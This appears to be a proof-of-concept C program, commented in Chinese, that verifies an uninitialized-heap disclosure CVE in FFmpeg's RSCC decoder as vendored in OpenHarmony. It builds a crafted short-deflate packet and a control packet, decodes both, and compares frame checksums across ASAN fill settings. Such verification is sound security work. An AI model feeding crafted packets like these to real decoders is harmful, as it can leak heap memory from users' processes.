/*
 * CVE-2026-70629 运行验证 PoC — third_party/ffmpeg RSCC 短解压未初始化堆披露
 *
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c) 的 libavcodec/rscc.c 与上游
 * n7.1.1 逐字节一致（case.json oh_source.equivalence），本 PoC 在该基线
 * 构建上执行，结论直接代表 OH 组件。上游修复 cd1f545c/a5fe21a1 以
 * memset 补零（本文件所附 patch.diff 为缺口侧证据）。
 *
 * 触发原理：rscc.c 像素分支在 pixel_size != packed_size 时以
 * uncompress(ctx->inflated_buf, &len=inflated_size, ...) 解压，实际填充
 * 仅 len 字节；后续 av_image_copy_plane 仍按 pixel_size 字节拷入输出帧
 * ——len < pixel_size 的尾部为 av_malloc 未初始化堆内存，随帧对外输出
 * （未初始化信息泄露，MSan 亦可观测）。
 *
 * 判读（确定性差分，无需 MSan）：同一输入解码两次，仅改变分配器填充字节——
 *   ASAN_OPTIONS=malloc_fill_byte=170:max_malloc_fill_size=200000 ./poc trigger
 *   ASAN_OPTIONS=malloc_fill_byte=187:max_malloc_fill_size=200000 ./poc trigger
 * trigger（短解压）两跑帧校验和不同 ⇒ 未初始化堆字节流入输出帧；
 * control（packed_size==pixel_size 原始路径）两跑校验和一致（无回归）。
 *
 * 用法：./poc_rscc trigger|control
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <zlib.h>

#include "libavcodec/avcodec.h"
#include "libavutil/frame.h"
#include "libavutil/mem.h"

#define W 64
#define H 64
#define COMP 3
#define PIXEL_SIZE (W * H * COMP) /* 12288 */

static void put_le16(uint8_t *p, unsigned v) { p[0] = v & 0xff; p[1] = (v >> 8) & 0xff; }

static uint64_t fnv1a(const uint8_t *data, size_t n)
{
    uint64_t h = 1469598103934665603ULL;
    for (size_t i = 0; i < n; i++) { h ^= data[i]; h *= 1099511628211ULL; }
    return h;
}

int main(int argc, char **argv)
{
    if (argc != 2 || (strcmp(argv[1], "trigger") && strcmp(argv[1], "control"))) {
        fprintf(stderr, "usage: %s trigger|control\n", argv[0]);
        return 2;
    }
    int control = !strcmp(argv[1], "control");

    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_RSCC);
    if (!codec) { fprintf(stderr, "rscc decoder not built\n"); return 3; }
    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) return 4;
    ctx->width = W;
    ctx->height = H;
    ctx->codec_tag = MKTAG('I', 'S', 'C', 'C');
    uint8_t extra[4] = {0, 0, 0, 0}; /* (extra[0]>>1)&1 == 0 -> BGR24, component_size 3 */
    ctx->extradata = (uint8_t *)av_memdup(extra, sizeof(extra));
    ctx->extradata_size = sizeof(extra);
    if (avcodec_open2(ctx, codec, NULL) < 0) { fprintf(stderr, "open failed\n"); return 5; }

    /* tiles_nb(1) + tile{x,w,y,h} + packed_size(le16) + data */
    uint8_t pkt[64 + PIXEL_SIZE];
    size_t n = 0;
    put_le16(pkt + n, 1); n += 2;              /* tiles_nb = 1 (<=5: no packed-tile section) */
    put_le16(pkt + n, 0); n += 2;              /* x */
    put_le16(pkt + n, W); n += 2;              /* w */
    put_le16(pkt + n, 0); n += 2;              /* y */
    put_le16(pkt + n, H); n += 2;              /* h -> pixel_size = 64*64*3 = 12288 */

    if (control) {
        put_le16(pkt + n, PIXEL_SIZE); n += 2; /* packed_size == pixel_size -> raw path */
        for (int i = 0; i < PIXEL_SIZE; i++) pkt[n++] = (uint8_t)i;
    } else {
        /* 短但合法的 deflate：16 字节全零压缩后约 ~11 字节 << pixel_size */
        uint8_t src[16] = {0};
        uLongf clen = sizeof(pkt) - n - 2;
        uint8_t body[256];
        uLongf blen = sizeof(body);
        if (compress2(body, &blen, src, sizeof(src), 9) != Z_OK) return 6;
        put_le16(pkt + n, (unsigned)blen); n += 2;
        memcpy(pkt + n, body, blen); n += blen;
    }

    AVPacket *packet = av_packet_alloc();
    av_new_packet(packet, (int)n);
    memcpy(packet->data, pkt, n);
    if (avcodec_send_packet(ctx, packet) < 0) { fprintf(stderr, "send_packet failed\n"); return 7; }
    AVFrame *frame = av_frame_alloc();
    int ret = avcodec_receive_frame(ctx, frame);
    if (ret < 0) {
        printf("case=rscc_%s decode_ret=%d (no frame)\n", argv[1], ret);
    } else {
        uint64_t sum = fnv1a(frame->data[0], (size_t)frame->height * (size_t)frame->linesize[0]);
        printf("case=rscc_%s frame=%dx%d checksum=%016llx\n",
               argv[1], frame->width, frame->height, (unsigned long long)sum);
    }
    av_frame_free(&frame);
    av_packet_free(&packet);
    avcodec_free_context(&ctx);
    return 0;
}
